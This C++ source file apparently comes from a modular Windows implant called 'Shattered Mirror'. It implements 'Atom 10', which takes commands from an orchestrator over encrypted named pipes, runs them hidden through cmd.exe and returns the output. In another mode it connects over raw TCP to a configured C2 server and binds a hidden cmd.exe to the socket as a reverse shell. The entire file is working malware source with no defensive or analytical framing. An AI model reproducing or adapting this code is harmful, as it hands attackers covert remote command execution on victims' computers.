/*=============================================================================
 * Shattered Mirror v1 — Atom 10: Interactive Reverse Shell
 * TRUE RAW TCP SHELL: Connects directly to C2_DOMAIN:PUBLIC_PORT
 * Bypasses HTTP layer for low-latency interactive sessions.
 *===========================================================================*/

#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include "Atom_10_Shell.h"
#include "../Orchestrator/AtomManager.h"
#include "../Orchestrator/Config.h"
#include <cstdio>

#pragma comment(lib, "ws2_32.lib")

static void ShellTrace(const char *format, ...) {
  if (!Config::LOGGING_ENABLED) return;
  char buf[512];
  va_list args;
  va_start(args, format);
  int len = vsnprintf(buf, sizeof(buf), format, args);
  va_end(args);
  if (len > 0) {
    char full[600];
    sprintf_s(full, "[SHELL %lu] %s\n", GetCurrentThreadId(), buf);
    OutputDebugStringA(full);
    FILE *f = fopen("log\\shell_debug.txt", "a");
    if (f) {
      fprintf(f, "%s", full);
      fclose(f);
    }
  }
}

DWORD WINAPI ReverseShellAtomMain(LPVOID lpParam) {
  DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
  ShellTrace("=== Atom 10 Started (RAW TCP). ID: %lu ===", dwAtomId);

  HANDLE hCmdPipe = IPC_ConnectToCommandPipe(dwAtomId);
  HANDLE hReportPipe = IPC_ConnectToReportPipe(dwAtomId);
  BYTE SharedSessionKey[16];
  memcpy(SharedSessionKey, Config::PSK_ID, 16);

  if (hReportPipe) {
    IPC_MESSAGE readyMsg = {0};
    readyMsg.dwSignature = 0x534D4952;
    readyMsg.CommandId = CMD_READY;
    readyMsg.dwPayloadLen = 0;
    IPC_SendMessage(hReportPipe, &readyMsg, SharedSessionKey, 16);
  }

  // Main command loop — handles both Bale and CS2 modes
  while (TRUE) {
    DWORD dwAvail = 0;
    if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
      IPC_MESSAGE inMsg = {0};
      if (IPC_ReceiveMessage(hCmdPipe, &inMsg, SharedSessionKey, 16)) {
        if (inMsg.CommandId == CMD_EXECUTE) {
          std::string cmd((char*)inMsg.Payload, inMsg.dwPayloadLen);
          BOOL bIsBale = (cmd.find("BALE_") == 0);

          if (bIsBale) {
            // === BALE SHELL: One-shot cmd /c execution with output capture ===
            std::string shellCmd = cmd.substr(5); // Strip "BALE_" prefix
            ShellTrace("BALE shell: executing '%s'", shellCmd.c_str());

            // Create pipes for stdout capture
            HANDLE hReadPipe, hWritePipe;
            SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
            if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
              ShellTrace("CreatePipe failed: %lu", GetLastError());
              continue;
            }

            STARTUPINFOA si;
            memset(&si, 0, sizeof(si));
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
            si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
            si.hStdOutput = hWritePipe;
            si.hStdError = hWritePipe;
            si.wShowWindow = SW_HIDE;

            PROCESS_INFORMATION pi;
            memset(&pi, 0, sizeof(pi));

            char cmdLine[2048];
            sprintf_s(cmdLine, "cmd.exe /c %s", shellCmd.c_str());

            if (CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
              CloseHandle(hWritePipe); // Must close write end so ReadFile will return when child exits
              hWritePipe = NULL;

              // Read all stdout from the child process
              std::string output;
              char readBuf[4096];
              DWORD dwRead = 0;
              while (ReadFile(hReadPipe, readBuf, sizeof(readBuf) - 1, &dwRead, NULL) && dwRead > 0) {
                readBuf[dwRead] = '\0';
                output += readBuf;
              }

              WaitForSingleObject(pi.hProcess, 30000); // 30s timeout
              CloseHandle(pi.hProcess);
              CloseHandle(pi.hThread);

              // Send output back via IPC
              if (output.empty()) output = "[No output]";
              std::string fullReport = "[SHELL] " + shellCmd + "\n" + output;

              // Send in chunks if needed (reports can be long)
              DWORD offset = 0;
              while (offset < (DWORD)fullReport.length()) {
                DWORD chunkSize = min((DWORD)fullReport.length() - offset, MAX_IPC_PAYLOAD_SIZE - 32);
                IPC_MESSAGE outMsg = {0};
                outMsg.dwSignature = 0x534D4952;
                outMsg.CommandId = CMD_REPORT;
                outMsg.AtomId = dwAtomId;
                outMsg.dwPayloadLen = chunkSize;
                memcpy(outMsg.Payload, fullReport.c_str() + offset, chunkSize);
                IPC_SendMessage(hReportPipe, &outMsg, SharedSessionKey, 16);
                offset += chunkSize;
              }
              ShellTrace("BALE shell output sent: %zu bytes", fullReport.length());
            } else {
              ShellTrace("CreateProcess failed: %lu", GetLastError());
              const char* errMsg = "[SHELL] Failed to execute command.";
              IPC_MESSAGE errReport = {0};
              errReport.dwSignature = 0x534D4952;
              errReport.CommandId = CMD_REPORT;
              errReport.AtomId = dwAtomId;
              errReport.dwPayloadLen = (DWORD)strlen(errMsg);
              memcpy(errReport.Payload, errMsg, errReport.dwPayloadLen);
              IPC_SendMessage(hReportPipe, &errReport, SharedSessionKey, 16);
            }
            if (hWritePipe) CloseHandle(hWritePipe);
            CloseHandle(hReadPipe);

          } else {
            // === CS2 RAW TCP SHELL (original behavior) ===
            ShellTrace("CS2 raw TCP shell mode.");

            WSADATA wsaData;
            if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) continue;

            SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
            if (sock == INVALID_SOCKET) { WSACleanup(); continue; }

            char shell_domain[256] = {0};
            int shell_port = 0;
            Config::GetActiveC2Target(shell_domain, sizeof(shell_domain), &shell_port);

            struct hostent *host = gethostbyname(shell_domain);
            if (!host) { closesocket(sock); WSACleanup(); continue; }

            SOCKADDR_IN sin;
            memset(&sin, 0, sizeof(sin));
            sin.sin_family = AF_INET;
            sin.sin_port = htons((u_short)shell_port);
            sin.sin_addr.s_addr = *((unsigned long*)host->h_addr);

            if (connect(sock, (SOCKADDR*)&sin, sizeof(sin)) == SOCKET_ERROR) {
              closesocket(sock); WSACleanup(); continue;
            }

            ShellTrace("Connected to %s:%d", shell_domain, shell_port);
            const char* init_str = "SHLL\n";
            send(sock, init_str, 5, 0);

            STARTUPINFOA si;
            memset(&si, 0, sizeof(si));
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
            si.hStdInput = (HANDLE)sock;
            si.hStdOutput = (HANDLE)sock;
            si.hStdError = (HANDLE)sock;
            si.wShowWindow = SW_HIDE;

            PROCESS_INFORMATION pi;
            memset(&pi, 0, sizeof(pi));

            char cmdLine[] = "cmd.exe";
            if (CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
              WaitForSingleObject(pi.hProcess, INFINITE);
              CloseHandle(pi.hProcess);
              CloseHandle(pi.hThread);
            }
            closesocket(sock);
            WSACleanup();
          }
        } else if (inMsg.CommandId == CMD_TERMINATE) {
          break;
        }
      }
    }
    Sleep(100);
  }

  if (hReportPipe) {
    const char* exitMsg = "[SHELL] Connection closed.";
    IPC_MESSAGE exitReport = {0};
    exitReport.dwSignature = 0x534D4952;
    exitReport.CommandId = CMD_REPORT;
    exitReport.dwPayloadLen = (DWORD)strlen(exitMsg);
    memcpy(exitReport.Payload, exitMsg, exitReport.dwPayloadLen);
    IPC_SendMessage(hReportPipe, &exitReport, SharedSessionKey, 16);
    CloseHandle(hReportPipe);
  }
  if (hCmdPipe) CloseHandle(hCmdPipe);

  ShellTrace("Atom 10 exiting cleanly.");
  return 0;
}